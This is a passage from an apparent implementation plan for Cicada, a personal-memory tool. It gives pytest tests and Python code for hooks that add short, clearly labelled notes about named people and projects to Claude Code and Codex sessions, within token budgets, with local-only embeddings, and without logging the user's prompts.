                           "entity_name": "Alpha Project", "question": "Is the beta still on October 1?",
                           "priority": 0.5}, "ctx")
    markdown_parser.write(memory / "inbox" / "inbox-002.md",
                          {"kind": "conflict", "status": "pending", "entity_id": "bob-example",
                           "entity_name": "Bob Example", "question": "Which studio?",
                           "remind_after": "2099-01-01"}, "ctx")
    markdown_parser.write(memory / "inbox" / "inbox-003.md",
                          {"kind": "normalization", "status": "pending", "entity_id": "alpha-project",
                           "entity_name": "Alpha Project", "question": "Fold a predicate?"}, "ctx")
    _index(memory)
    return memory


# R-H2's table: the floor, decided on these and recorded as the ruling.
CASES = [
    ("How is the Alpha Project going?", ["alpha-project"]),
    ("can you ask bob about the designs", ["bob-example"]),
    ("Draft an email to Bob Example and cc the alpha team", ["bob-example", "alpha-project"]),
    ("What did we decide about temporal decay?", ["temporal-decay"]),
    ("Is Example Corp still a client?", ["example-corp"]),
    ("write a python script to rename files", ["python-tool"]),
    ("ALPHA PROJECT status?", ["alpha-project"]),
    ("book a desk at the zurich office", ["zurich"]),
    ("fix the failing test in the parser", []),
    ("there's a memory leak in the app", []),            # a one-word concept name is never a mention
    ("let's decay the learning rate", []),               # half of a two-word name is not the name
    ("the example in the docs is wrong", []),            # "example" alone names neither Example page
    ("what happened to the old project", []),            # archived
    ("Pat, remember to push", []),                       # the owner is the primer's, not a note's
    ("open cicada api in the editor", []),               # a directory never
    ("tell me about gamma thing", []),                   # a page with nothing to say
    ("thanks!", []),
    ("ok", []),
]


@pytest.mark.parametrize("prompt,expected", CASES, ids=[c[0][:32] for c in CASES])
def test_the_floor_injects_only_what_the_message_names(bank, prompt, expected):
    result = hook_recall.prompt_context(bank, prompt)
    assert list(result.injected) == expected, result.reason
    assert (result.text is None) == (not expected)


def test_a_miss_says_why_in_an_enum(bank):
    assert hook_recall.prompt_context(bank, "ok").reason == "no_terms"
    assert hook_recall.prompt_context(bank, "fix the failing test").reason == "no_match"
    assert hook_recall.prompt_context(bank, "alpha project?").reason == "injected"
    assert set(hook_recall.REASONS) >= {"injected", "primer", "no_terms", "no_match", "recently_shown",
                                        "index_not_ready", "no_bank", "timeout", "error"}


def test_the_note_says_what_the_page_holds_and_nothing_stale(bank):
    result = hook_recall.prompt_context(bank, "How is the Alpha Project going?")
    text = result.text
    assert text.startswith(recall_text.RECALL_HEADER) and text.endswith(recall_text.RECALL_FOOTER)
    assert "- Alpha Project (project, `alpha-project`): Rebuilding the onboarding flow for the beta." in text
    assert "  · The beta ships on October 1. (since 2026-09-01)" in text
    assert "  · Bob Example reviews the designs. (since 2026-08-20)" in text
    assert "September" not in text, "a closed claim is history, not recall"
    assert "shared board" not in text, "at most two current claims, newest first"
    assert "`inbox-001`" in text and "Is the beta still on October 1?" in text
    assert "inbox-003" not in text, "normalization items are app-only (check_nudges' filter)"
    assert 'cicada_check_nudges(entity_ids=["alpha-project"])' in text
    assert result.inbox_id == "inbox-001" and result.tokens <= hook_recall.MAX_TOKENS


def test_a_deferred_question_is_never_pointed_at(bank):
    result = hook_recall.prompt_context(bank, "can you ask bob about it")
    assert result.injected == ("bob-example",) and "inbox-002" not in result.text and result.inbox_id is None


def test_the_body_never_names_a_page(bank):
    with search_index.Reader(bank) as reader:
        docs = reader.docs([d for d, _ in reader.name_candidates(["alpha"], 40)])
    assert "delta-zero" not in {d.ref for d in docs.values()}, "R-H3: title and aliases only"


def test_the_note_never_exceeds_its_budget(tmp_path):
    memory = tmp_path / "memory"
    for sub in ("entities", "episodes", "inbox"):
        (memory / sub).mkdir(parents=True)
    long = "word " * 400
    for n in range(3):
        _page(memory, f"huge-{n}", f"Huge {n} " + "x" * 190, "project", aliases=[f"Hugealias{n}"], summary=long,
              claims=[_claim(f"h{n}{k}", long[:390], subject=f"huge-{n}", since=f"2026-09-0{k + 1}")
                      for k in range(3)])
    _index(memory)
    result = hook_recall.prompt_context(memory, "hugealias0 hugealias1 hugealias2")
    assert result.text and result.tokens <= hook_recall.MAX_TOKENS
    assert result.injected and result.injected[0] in {"huge-0", "huge-1", "huge-2"}
    for page_id in result.injected:
        assert f"`{page_id}`" in result.text, "the ledger and the window record only what was shown"


def test_recently_shown_pages_step_aside_for_two_firings(bank):
    session = "s-1"

    def fire(prompt):
        result = hook_recall.prompt_context(bank, prompt, recent=hook_recall.RECENT.recent(session))
        hook_recall.RECENT.remember(session, result.injected)
        return result

    assert fire("Alpha Project?").injected == ("alpha-project",)                    # t1
    assert fire("and the alpha project budget?").reason == "recently_shown"          # t2: t1 is in the window
    assert fire("alpha project again").reason == "recently_shown", "t3: the window [t1, t2] still holds t1"
    assert fire("alpha project, once more").injected == ("alpha-project",), "t4: the window is [t2, t3]"
    assert fire("fix the failing test").reason == "no_match"                        # a miss ages the window too
    hook_recall.RECENT.reset(session)
    assert fire("alpha project").injected == ("alpha-project",), "SessionStart resets the window"


def test_the_window_is_bounded():
    window = hook_recall.RecentPages(turns=2, sessions=3)
    for n in range(5):
        window.remember(f"s{n}", ["alpha-project"])
    assert window.recent("s0") == frozenset() and window.recent("s4") == {"alpha-project"}


def test_a_long_prompt_reads_its_head_and_its_tail(bank):
    pasted = "lorem ipsum dolor " * 1500
    assert hook_recall.prompt_context(bank, pasted + " so how is the alpha project?").injected == ("alpha-project",)
    middle = "lorem " * 1200 + "alpha project " + "ipsum " * 3000
    assert hook_recall.prompt_context(bank, middle).injected == ()
    window = hook_recall.prompt_window("a" * 20_000)
    assert len(window) == hook_recall.HEAD_CHARS + 1 + hook_recall.TAIL_CHARS


def test_no_usable_index_injects_nothing(bank, monkeypatch):
    monkeypatch.setattr(search_index, "ensure_fresh", lambda *a, **k: "building")
    assert hook_recall.prompt_context(bank, "alpha project").reason == "index_not_ready"


def test_the_session_primer_fits_both_harness_caps(bank):
    for harness in ("claude-code", "codex"):
        result = hook_recall.session_primer(bank, harness)
        assert result.reason == "primer" and result.injected == ()
        assert result.text.startswith(recall_text.PRIMER_HEADER)
        assert "# Cicada — personal memory for this person" in result.text
        assert len(result.text) <= 9_500, "Claude Code caps a hook string at 10,000 chars; Codex at 2,500 tokens"
    assert recall_text.is_injection(hook_recall.session_primer(bank, "codex").text)


def test_nudge_visible_is_check_nudges_filter():
    today = "2026-09-24"
    base = {"kind": "conflict", "entity_id": "alpha-project"}
    assert mcp_tools.nudge_visible(base, wanted={"alpha-project"}, today=today)
    assert not mcp_tools.nudge_visible({**base, "kind": "normalization"}, wanted=set(), today=today)
    assert not mcp_tools.nudge_visible(base, wanted={"bob-example"}, today=today)
    assert not mcp_tools.nudge_visible({**base, "remind_after": "2099-01-01"}, wanted=set(), today=today)
    assert not mcp_tools.nudge_visible(base, wanted=set(), today=today, skipped={"inbox-9"}, stem="inbox-9")
    assert mcp_tools.nudge_visible(base, wanted=set(), today=today), "no ids = no entity filter (check_nudges)"


# --- R-H4: the stored vectors re-order named pages, only on-device and already loaded ---

MODEL = "test/on-device-model"


def _one_hot(texts, *, is_query=False):
    rows = np.zeros((len(texts), 8), dtype=np.float32)
    for i, text in enumerate(texts):
        rows[i, 0] = 0.01
        for k in range(1, 6):
            if f"k{k}" in text.lower().split():
                rows[i, k] = 1.0
    return rows / np.linalg.norm(rows, axis=1, keepdims=True)


@pytest.fixture
def five(tmp_path):
    from api.services.vector_index import SqliteVecIndexer

    memory = tmp_path / "memory"
    for sub in ("entities", "episodes", "inbox"):
        (memory / sub).mkdir(parents=True)
    words = ["One", "Two", "Three", "Four", "Five"]
    for n, word in enumerate(words, 1):
        _page(memory, f"alpha-{word.lower()}", f"Alpha {word}", "project", aliases=["Alpha"],
              confidence=1.0 - n / 10, summary=f"Marker k{n} lives here.")
    _page(memory, "zeta-page", "Zeta Page", "project", summary="Marker k5 k5 k5.")   # the vectors' favourite
    _index(memory)
    SqliteVecIndexer(memory, embed_fn=_one_hot, model_name=MODEL).index_entities()
    return memory


def test_the_vectors_reorder_pages_the_message_named_when_the_model_is_warm(five, monkeypatch):
    calls = []

    def embed(texts, *, is_query=False):
        calls.append(is_query)
        return _one_hot(texts, is_query=is_query)

    monkeypatch.setitem(providers._EMBED_CACHE, MODEL, (embed, MODEL))
    result = hook_recall.prompt_context(five, "what about alpha k5", deadline=10**9, clock=lambda: 0.0)
    assert result.injected[0] == "alpha-five" and len(result.injected) == 3
    assert "zeta-page" not in result.injected, "R-H4: the vectors never add a page the message did not name"
    assert calls == [True]


def test_a_cold_or_hosted_model_is_never_loaded_or_called(five, monkeypatch):
    def boom(*a, **k):
        raise AssertionError("the hook must never build or call an embedder here")

    monkeypatch.setattr(providers, "cached_embed_fn_for_model", boom)
    monkeypatch.setattr(providers, "resolve_embed_fn_for_model", boom)
    lexical = ("alpha-one", "alpha-two", "alpha-three")
    assert hook_recall.prompt_context(five, "alpha k5", deadline=10**9, clock=lambda: 0.0).injected == lexical
    hook_recall.reset()
    monkeypatch.setattr(hook_recall, "_recorded_model", lambda _m: "text-embedding-3-small")
    monkeypatch.setitem(providers._EMBED_CACHE, "text-embedding-3-small", (boom, "text-embedding-3-small"))
    assert hook_recall.prompt_context(five, "alpha k5", deadline=10**9, clock=lambda: 0.0).injected == lexical
    assert providers.warm_local_embed_fn("openrouter/google/gemini-embedding") is None
    assert providers.warm_local_embed_fn(None) is None and providers.warm_local_embed_fn("unknown") is None


def test_no_time_left_means_no_rerank(five, monkeypatch):
    monkeypatch.setitem(providers._EMBED_CACHE, MODEL, (_one_hot, MODEL))
    result = hook_recall.prompt_context(five, "alpha k5", deadline=0.1, clock=lambda: 0.0)
    assert result.injected == ("alpha-one", "alpha-two", "alpha-three")
```

Run: `cd <worktree> && api/.venv/bin/python -m pytest api/tests/test_hook_recall.py -q -p no:cacheprovider` →
collection error: `hook_recall` / `recall_text` do not exist. That is the red.

- [ ] **Step 2: `api/services/recall_text.py`.**

```python
"""The words Cicada's recall hook puts in front of a model (G149).

Three places must agree on them, so they live in one small module with no
service imports: the composer (``hook_recall``), the contract item that tells
an agent what they are (``handshake._CONTRACT`` item 8), and the capture filter
that keeps them out of an episode (``transcript_extract``). A note Cicada
recalled, captured back as "the person said", would hand Sleep its own memory
as new evidence (R-H12).

Written as statements, never commands. Claude Code's hook reference (read
2026-09-24, "Add context for Claude") warns that text framed as out-of-band
system instructions can trip the model's prompt-injection defences, so each
header says where the note came from and what it is.
"""
from __future__ import annotations

#: Every note opens with this; ``is_injection`` and the contract key on it.
INJECTION_PREFIX = "From Cicada (the person's memory; added"
RECALL_HEADER = INJECTION_PREFIX + " by Cicada's hook, not typed by them) — what it holds about names in this message:"
PRIMER_HEADER = (INJECTION_PREFIX + " at session start by Cicada's hook) — the primer its MCP server also sends "
                 "when it connects.")
RECALL_FOOTER = "More on any page: `cicada_recall_detail(entity_id)`."


def is_injection(text: str | None) -> bool:
    """True when ``text`` is one of Cicada's own notes (either header)."""
    return (text or "").lstrip().startswith(INJECTION_PREFIX)


def question_line(name: str, item_id: str, entity_id: str, question: str) -> str:
    """The one inbox pointer a note may carry (R-H5): the question's words when
    the item stores them, never its options or its cause. Those stay behind
    ``cicada_check_nudges``, which also knows whether the agent skipped it."""
    what = f": {question}" if question else " (a follow-up)"
    return (f"Open question for the person about {name} (`{item_id}`){what} — it can wait until their request "
            f"is done; `cicada_check_nudges(entity_ids=[\"{entity_id}\"])` shows the choices.")
```

- [ ] **Step 3: `search_index.Reader` gains three reads** (insert after `docs`, `:875-880`):

```python
    def name_candidates(self, terms: list[str], limit: int) -> list[tuple[int, float]]:
        """``[(doc_id, bm25)]`` of entity pages whose name or an alias holds one
        of ``terms`` as a WHOLE word, best first (G149 R-H3).

        The recall hook's candidate read. An OR over the ``title`` and
        ``aliases`` columns only, never the body and never a prefix: a prompt is
        prose, so ``match_expression``'s implicit AND would ask every word of it
        to match, and a prefix OR ("the"*) would match half the graph. ``terms``
        come from ``text_fold.words`` (alphanumeric) and are quoted, so FTS5
        reads an ``OR`` or ``NEAR`` in a prompt as a word, never an operator."""
        if not terms:
            return []
        expr = "{title aliases} : (" + " OR ".join(f'"{t}"' for t in terms) + ")"
        sql = (f"SELECT rowid >> {ROW_BITS}, bm25(ent, {WEIGHTS['ent']}) AS r "
               "FROM ent WHERE ent MATCH ? ORDER BY r LIMIT ?")
        return [(int(i), float(r)) for i, r in self.conn.execute(sql, (expr, int(limit)))]

    def claims_of(self, doc_id: int) -> list[tuple[str, dict]]:
        """One page's indexed claims in fence order, ``[(text, payload)]``,
        superseded ones included (the caller decides what is current). A rowid
        range scan: claim ``n`` is row ``doc_id << ROW_BITS | n``, ``n >= 1``."""
        lo = int(doc_id) << ROW_BITS
        out: list[tuple[str, dict]] = []
        for text, payload in self.conn.execute(
                "SELECT title, payload FROM clm WHERE rowid > ? AND rowid <= ? ORDER BY rowid",
                (lo, lo | MAX_ROWS_PER_DOC)):
            try:
                out.append((str(text or ""), json.loads(payload or "{}")))
            except ValueError:
                continue
        return out

    def inbox_docs(self) -> list[Doc]:
        """Every indexed inbox item, at most a few hundred on a real bank.
        ``meta`` holds the served question, kind, subject and ``remind_after``
        (``_index_inbox``), which is everything ``mcp_tools.nudge_visible`` reads."""
        rows = self.conn.execute("SELECT id, kind, ref, meta FROM docs WHERE kind = 'inbox'")
        return [Doc(int(i), k, r, json.loads(m or "{}")) for i, k, r, m in rows]
```

- [ ] **Step 4: `providers.warm_local_embed_fn`** (insert after `clear_embed_cache`, `:61-64`):

```python
def warm_local_embed_fn(model_id: str | None) -> EmbedFn | None:
    """The query embedder for ``model_id`` only when it runs ON THIS MAC and is
    ALREADY loaded in this process; ``None`` otherwise. Never a build.

    G149 R-H4: the recall hook may re-order pages with the stored vectors, but
    it fires on every prompt. It must never pay a multi-second model load inside
    a 300 ms budget (``cached_embed_fn_for_model`` builds on a miss), and it
    must never send the person's words to a hosted embedding API (OpenAI,
    OpenRouter). The palette's opt-in hybrid search has that data flow; an
    automatic per-prompt hook must not."""
    mid = (model_id or "").strip()
    if not mid or mid == "unknown" or _model_is_openai(mid) or _model_is_openrouter(mid):
        return None
    with _EMBED_LOCK:
        hit = _EMBED_CACHE.get(mid)
    return hit[0] if hit else None
```

- [ ] **Step 5: `mcp_tools.nudge_visible`**. Add it directly above `def check_nudges`, and use it in the loop.

```python
def nudge_visible(fm: dict, *, wanted, today: str, skipped=frozenset(), stem: str = "") -> bool:
    """``check_nudges``' item filter, shared with the recall hook (G149) so an
    item the hook points at is exactly an item ``cicada_check_nudges`` lists:
    not an id this session skipped, never ``normalization`` (app-only audit
    rows), the subject in ``wanted`` when ids were given (G75 R12's exact
    match), and not deferred. ``fm`` may be a frontmatter dict or the search
    index's inbox ``meta``; both carry ``kind``, ``entity_id``, ``remind_after``."""
    from api.services import inbox_questions

    if stem and stem in skipped:
        return False
    if str(fm.get("kind") or "") == "normalization":
        return False
    if wanted and str(fm.get("entity_id") or "") not in wanted:
        return False
    return not inbox_questions.is_deferred(fm, today)
```

In `check_nudges` (`:2275-2296`), replace the two `continue` checks after `fm, body = parse_frontmatter(content)`
with `if not nudge_visible(fm, wanted=wanted, today=today): continue`. Then delete the later
`from api.services import inbox_questions` + `if inbox_questions.is_deferred(fm, today): continue` (now inside the
predicate). The skipped-id check stays where it is, before the file read. The existing check_nudges tests prove
the behaviour is unchanged.

- [ ] **Step 6: `api/services/hook_recall.py`** (Task 1 part; Task 2 appends `respond` and `record`):

```python
"""Implicit recall through the harnesses' own hooks (G149).

G105 took capture away from the chatting model: the harness's Stop hook saves
every session whether or not a model calls ``cicada_save_episode``. Recall
never got the same treatment. ``cicada_recall``, ``cicada_ask`` and the rest
reach a model only when it chooses to call them, and a skipped call is silent
(G149; G105's own measurement was zero MCP invocations in 12 days). This
module is what the SessionStart and UserPromptSubmit hooks
(``api/hooks/recall.py`` → ``POST /capture/hook-context``) put in front of the
model instead:

* SessionStart → the connection primer (G75, ``handshake.load_or_build``)
  under a "From Cicada" header. This is G76(b)(iv)'s unshipped half, and it
  replaces ``HOOK_POINTER``'s request that the model call a tool (R-H8).
* UserPromptSubmit → at most three pages the message NAMES (R-H2), each with
  its one-line summary and at most two current claims with their dates, plus
  at most one open inbox question about them. The note is ≤ 400 tokens, or
  nothing (R-H5).

Rails:
* Engine-free: FTS reads from the derived index (G136), plus one query
  embedding only when the on-device embedder is already loaded (R-H4).
* Read-only: nothing here writes a bank.
* The prompt is never logged, stored or sent to telemetry (G136 K9, R-H10),
  so nothing on this path calls ``logger.exception``. Loguru's ``diagnose``
  would print the prompt from a frame's locals.
* A miss injects nothing.
"""
from __future__ import annotations

import threading
import time
from collections import OrderedDict, deque
from dataclasses import dataclass, replace
from datetime import date
from pathlib import Path

from api.services import handshake, mcp_tools, recall_text, search_index, state_dictionary, text_fold

# Budgets (R-H5, R-H6).
PROMPT_BUDGET_S = 0.300
PRIMER_BUDGET_S = 0.800
HYBRID_RESERVE_S = 0.150
MAX_TOKENS = 400
MAX_PAGES = 3
MAX_CLAIMS_PER_PAGE = 2
NAME_CHARS = 80
SUMMARY_CHARS = 140
CLAIM_CHARS = 140
QUESTION_CHARS = 120
# The prompt window (R-H5); PROMPT_MAX_CHARS is the route's hard limit (a 422 past it).
PROMPT_MAX_CHARS = 20_000
HEAD_CHARS = 6_000
TAIL_CHARS = 2_000
MAX_TERMS = 48
CANDIDATES = 40
MAX_NAME_WORDS = 8
MIN_WORD_CHARS = 3
# The floor (R-H2).
SINGLE_WORD_TYPES = frozenset({"person", "project", "company", "tool", "location"})
SKIP_TYPES = frozenset({"media", "directory", "deadline"})
LIVE_STATUSES = frozenset({"active", "decaying"})
# Freshness and memory (R-H7).
FRESHNESS_S = 30.0
RECENT_TURNS = 2
MAX_SESSIONS = 512
MODEL_TTL_S = 60.0
SEMANTIC_K = 30
SEMANTIC_CHARS = 2_000

REASONS = ("injected", "primer", "no_terms", "no_match", "recently_shown", "index_not_ready", "no_bank",
           "timeout", "error")

#: Folded words that name nothing (R-H2, R-H3): English and Spanish function
#: words plus the verbs and nouns every coding prompt uses. A name made only of
#: them is never a mention; a term that is one never becomes an FTS candidate.
STOPWORDS = frozenset("""
a about above after again all also am an and any are as at be because been before being below between both but by
can cannot could did do does doing done down during each else ever every few for from further get gets getting give
go goes going gone got had has have having he her here hers him his how however i if in into is it its just let lets
like made make makes many may me might more most much must my need needs no nor not now of off ok okay on once only
or other our ours out over own please quite rather really same see seem she should so some still such sure than
thank thanks that the their theirs them then there these they thing things this those though through thus to too
under until up upon us use used using very via want wants was way we well were what whatever when where whether which
while who whom whose why will with within without would yes yet you your yours yourself
add check fix help look show tell write run try new old one two first last next today tomorrow yesterday time file
files code change changes update work working
al algo alguna algun como con contra cual cuando del desde donde ella ellas ellos entre era esa ese eso esta estas
este esto estos fue hay las les los mas muy nada nos otra otro para pero poco por porque que quien sea ser sin sobre
son sus tambien tengo una uno unos gracias hola hacer puedes quiero
""".split())


@dataclass(frozen=True)
class Injection:
    """What one hook firing gets: the note (or ``None``), the pages it shows
    (what the session window remembers), and why, as an enum from ``REASONS``
    that the ledger and ``recall.log`` carry instead of text."""

    text: str | None
    injected: tuple[str, ...] = ()
    reason: str = "no_match"
    inbox_id: str | None = None

    @property
    def tokens(self) -> int:
        """The chars/4 proxy the handshake uses (its R10): no tokenizer offline."""
        return len(self.text) // 4 if self.text else 0

    @classmethod
    def none(cls, reason: str) -> "Injection":
        return cls(None, (), reason)


@dataclass(frozen=True)
class PageNote:
    """One page as a note shows it."""

    id: str
    name: str
    type: str
    summary: str
    claims: tuple[tuple[str, str | None], ...] = ()


def prompt_window(prompt: str) -> str:
    """The part of a prompt the hook reads (R-H5): all of it up to 8,000
    characters, else the first 6,000 and the last 2,000. A question typed after
    a pasted log sits at the end, and a 1 MB paste must not cost the budget."""
    prompt = prompt or ""
    if len(prompt) <= HEAD_CHARS + TAIL_CHARS:
        return prompt
    return prompt[:HEAD_CHARS] + "\n" + prompt[-TAIL_CHARS:]


def prompt_terms(prompt: str) -> tuple[list[str], list[str]]:
    """``(words, terms)``: the window's folded words in order (phrase matching)
    and its distinct content terms for the FTS candidate read (R-H3), taken from
    the END backwards, because the question usually closes the message."""
    words = text_fold.words(prompt_window(prompt))
    terms: list[str] = []
    seen: set[str] = set()
    for w in reversed(words):
        if len(w) < MIN_WORD_CHARS or w in STOPWORDS or w.isdigit() or w in seen:
            continue
        seen.add(w)
        terms.append(w)
        if len(terms) == MAX_TERMS:
            break
    return words, terms


def clip(text: str, limit: int) -> str:
    """Whitespace collapsed, cut on a word boundary with "…" past ``limit``."""
    flat = " ".join(str(text or "").split())
    if len(flat) <= limit:
        return flat
    cut = flat.rfind(" ", 0, limit - 1)
    return flat[: cut if cut > limit // 2 else limit - 1].rstrip() + "…"


def _says(words: list[str], positions: dict[str, list[int]], phrase: list[str]) -> bool:
    n = len(phrase)
    return any(words[i:i + n] == phrase for i in positions.get(phrase[0], ()))


def mention_strength(words: list[str], positions: dict[str, list[int]], meta: dict) -> int:
    """How many words of this page's name, or its best alias, the message says
    in a row. 0 when nothing it says passes the floor (R-H2).

    A name is matched whole, folded the way the index folds it, anywhere in the
    prompt window. A name of two words or more needs at least one real word
    (≥ 3 characters, not a stopword, not a number), so "The One" is not named
    by every "the one". A one-word name counts only for the types one word
    names (a person, a project, a company, a tool, a place): a concept called
    "Memory" is not named by "a memory leak"."""
    etype = str(meta.get("type") or "concept")
    best = 0
    for label in [meta.get("name") or "", *(meta.get("aliases") or [])]:
        phrase = text_fold.words(str(label))
        if not phrase or len(phrase) > MAX_NAME_WORDS or len(phrase) <= best:
            continue
        if not any(len(w) >= MIN_WORD_CHARS and w not in STOPWORDS and not w.isdigit() for w in phrase):
            continue
        if len(phrase) == 1 and etype not in SINGLE_WORD_TYPES:
            continue
        if _says(words, positions, phrase):
            best = len(phrase)
    return best


def _eligible(doc: search_index.Doc, owner: str | None) -> bool:
    meta = doc.meta
    return (doc.kind == "entity" and doc.ref != owner
            and str(meta.get("status") or "active") in LIVE_STATUSES
            and str(meta.get("type") or "concept") not in SKIP_TYPES)


def _rank_key(meta: dict, strength: int, bm25: float) -> tuple:
    """The longer name said first, then a one-word-nameable type, then the
    page's confidence, then FTS's own bm25 (lower is better)."""
    return (-strength, 0 if meta.get("type") in SINGLE_WORD_TYPES else 1,
            -float(meta.get("confidence") or 0.0), bm25)


def current_claims(rows: list[tuple[str, dict]]) -> list[tuple[str, str | None]]:
    """At most two CURRENT claims, newest first, each with the day it became
    true (R-H5). Closed and superseded claims are history, not recall, and a
    done happening is born closed (G141), so it drops out with them."""
    live = [(text, p) for text, p in rows
            if text.strip() and isinstance(p, dict) and not p.get("valid_to") and not p.get("superseded_by")]
    live.sort(key=lambda r: (str(r[1].get("valid_from") or ""), float(r[1].get("confidence") or 0.0)),
              reverse=True)
    return [(clip(text, CLAIM_CHARS), str(p.get("valid_from") or "")[:10] or None)
            for text, p in live[:MAX_CLAIMS_PER_PAGE]]


def _page_note(doc: search_index.Doc, claim_rows: list[tuple[str, dict]]) -> PageNote | None:
    meta = doc.meta
    claims = tuple(current_claims(claim_rows))
    summary = clip(str(meta.get("summary") or ""), SUMMARY_CHARS)
    if not claims and not summary:
        return None
    return PageNote(doc.ref, clip(str(meta.get("name") or doc.ref), NAME_CHARS),
                    str(meta.get("type") or "concept"), summary, claims)


def compose(pages: list[PageNote], question: str | None) -> str:
    lines = [recall_text.RECALL_HEADER]
    for p in pages:
        lines.append(f"- {p.name} ({p.type}, `{p.id}`)" + (f": {p.summary}" if p.summary else ""))
        lines += [f"  · {text}" + (f" (since {since})" if since else "") for text, since in p.claims]
    if question:
        lines.append(question)
    lines.append(recall_text.RECALL_FOOTER)
    return "\n".join(lines)


def fit(pages: list[PageNote], question: str | None) -> tuple[str, list[PageNote], str | None]:
    """The note within ``MAX_TOKENS`` (R-H5). Cuts, in this order, until it
    fits: each page's second claim (the last page first), the inbox line, every
    page after the first, the summaries to 60 characters, the claims. Returns
    the text and what survived, so the ledger and the session window record
    only what the model was shown. ``("", [], None)`` if even a header, one
    name line and the footer cannot fit (a pathological page id)."""
    pages = list(pages)

    def over() -> bool:
        return len(compose(pages, question)) // 4 > MAX_TOKENS

    for i in reversed(range(len(pages))):
        if not over():
            break
        if len(pages[i].claims) > 1:
            pages[i] = replace(pages[i], claims=pages[i].claims[:1])
    if over():
        question = None
    while over() and len(pages) > 1:
        pages.pop()
    if over():
        pages = [replace(p, summary=clip(p.summary, 60)) for p in pages]
    if over():
        pages = [replace(p, claims=()) for p in pages]
    if over():
        return "", [], None
    return compose(pages, question), pages, question


def _open_question(reader: search_index.Reader, pages: list[PageNote], today: str) -> tuple[str | None, str | None]:
    """At most one open inbox item about the pages shown (R-H5), chosen by the
    SAME filter ``cicada_check_nudges(entity_ids=…)`` applies
    (``mcp_tools.nudge_visible``) over the index's inbox rows. A pointer to
    the card, never the card. A follow-up's question is synthesised at read
    (G141 PJ-6) and is not in the index, so it reads "(a follow-up)"."""
    names = {p.id: p.name for p in pages}
    items = [d for d in reader.inbox_docs()
             if mcp_tools.nudge_visible(d.meta, wanted=frozenset(names), today=today)]
    if not items:
        return None, None
    items.sort(key=lambda d: (-float(d.meta.get("priority") or 0.0), d.ref))
    item = items[0]
    entity_id = str(item.meta.get("entity_id") or "")
    words = "" if item.meta.get("kind") == "followup" else clip(str(item.meta.get("question") or ""), QUESTION_CHARS)
    return recall_text.question_line(names[entity_id], item.ref, entity_id, words), item.ref


def _owner_id(memory_path: Path) -> str | None:
    """The person's own page (G117, via ``_state.md``'s cursor). The primer
    carries it already, and "I" would otherwise name it in every message."""
    state = state_dictionary.read_state(memory_path) or {}
    return str(state.get("owner_id") or "").strip() or None


_MODELS: dict[str, tuple[float, str | None]] = {}
_MODELS_LOCK = threading.Lock()


def _recorded_model(memory_path: Path) -> str | None:
    """The embedding model this bank's vectors were built with (``index_meta``),
    re-read at most once a minute, because opening the vector db loads an
    extension."""
    key, now = str(memory_path), time.monotonic()
    with _MODELS_LOCK:
        hit = _MODELS.get(key)
    if hit and now - hit[0] < MODEL_TTL_S:
        return hit[1]
    from api.services.vector_index import SqliteVecIndexer

    try:
        model = (SqliteVecIndexer(memory_path).index_info() or {}).get("model")
    except Exception:  # noqa: BLE001 — no vectors is an ordinary state
        model = None
    with _MODELS_LOCK:
        _MODELS[key] = (now, model)
    return model


def _semantic_ranks(memory_path: Path, prompt: str) -> dict[str, int] | None:
    """Each page's rank by the stored vectors, or ``None`` unless the bank's
    embedder runs on this Mac and is already loaded (R-H4)."""
    from api.services import providers

    embed = providers.warm_local_embed_fn(_recorded_model(memory_path))
    if embed is None:
        return None
    from api.services.vector_index import SqliteVecIndexer

    try:
        rows = SqliteVecIndexer(memory_path, embed_fn=embed).search_kinds(
            prompt_window(prompt)[:SEMANTIC_CHARS], {"entities": SEMANTIC_K}).get("entities", [])
    except Exception:  # noqa: BLE001 — the lexical order stands
        return None
    return {Path(str((r.get("metadata") or {}).get("file_path") or "")).stem: i for i, r in enumerate(rows)}


def prompt_context(memory_path: Path, prompt: str, *, recent: frozenset[str] = frozenset(),
                   deadline: float | None = None, clock=time.monotonic) -> Injection:
    """The UserPromptSubmit note for one message, or ``Injection.none(reason)``.

    ``recent`` is the session's window (R-H7): pages named again within it step
    aside. ``deadline`` is a ``clock()`` value, the end of the route's budget:
    the stored-vector re-rank starts only with ``HYBRID_RESERVE_S`` left."""
    memory_path = Path(memory_path)
    words, terms = prompt_terms(prompt)
    if not terms:
        return Injection.none("no_terms")
    if search_index.ensure_fresh(memory_path, max_age_s=FRESHNESS_S) not in ("ready", "stale"):
        return Injection.none("index_not_ready")
    owner = _owner_id(memory_path)
    positions: dict[str, list[int]] = {}
    for i, w in enumerate(words):
        positions.setdefault(w, []).append(i)
    with search_index.Reader(memory_path) as reader:
        rows = reader.name_candidates(terms, CANDIDATES)
        docs = reader.docs([d for d, _ in rows])
        ranked: list[tuple[tuple, int, search_index.Doc]] = []
        for doc_id, bm25 in rows:
            doc = docs.get(doc_id)
            if doc is None or not _eligible(doc, owner):
                continue
            strength = mention_strength(words, positions, doc.meta)
            if strength:
                ranked.append((_rank_key(doc.meta, strength, bm25), strength, doc))
        if not ranked:
            return Injection.none("no_match")
        ranked.sort(key=lambda r: r[0])
        fresh = [(strength, doc) for _key, strength, doc in ranked if doc.ref not in recent]
        if not fresh:
            return Injection.none("recently_shown")
        if len(fresh) > MAX_PAGES and deadline is not None and deadline - clock() >= HYBRID_RESERVE_S:
            ranks = _semantic_ranks(memory_path, prompt)
            if ranks:
                # R-H4: the vectors order pages the message named equally
                # loudly; they never add one it did not name.
                fresh.sort(key=lambda r: (-r[0], ranks.get(r[1].ref, len(ranks))))
        notes: list[PageNote] = []
        for _strength, doc in fresh:
            note = _page_note(doc, reader.claims_of(doc.id))
            if note is not None:
                notes.append(note)
            if len(notes) == MAX_PAGES:
                break
        if not notes:
            return Injection.none("no_match")
        question, inbox_id = _open_question(reader, notes, date.today().isoformat())
    text, shown, kept = fit(notes, question)
    if not text:
        return Injection.none("no_match")
    return Injection(text, tuple(p.id for p in shown), "injected", inbox_id if kept else None)


def session_primer(memory_path: Path, harness: str) -> Injection:
    """The SessionStart note: the connection primer (G75) under the "From
    Cicada" header. It is the text MCP ``initialize`` sends, cached the same way
    (``handshake.load_or_build``), because Claude Code truncates an MCP server's
    instructions (R-H8) and a harness that never asks for ``cicada_handshake``
    should still start informed. The handshake's ≤ 1,800-token budget keeps it
    inside both harnesses' caps. ``handshake.record`` is not called: its row
    lands in the events file and would tick the app's consumption domain."""
    variant = harness if harness in handshake.VARIANTS else "generic"
    text, _meta = handshake.load_or_build(Path(memory_path), variant=variant)
    return Injection(f"{recall_text.PRIMER_HEADER}\n\n{text}", (), "primer")


class RecentPages:
    """Per-session memory of what the last ``turns`` prompt firings showed
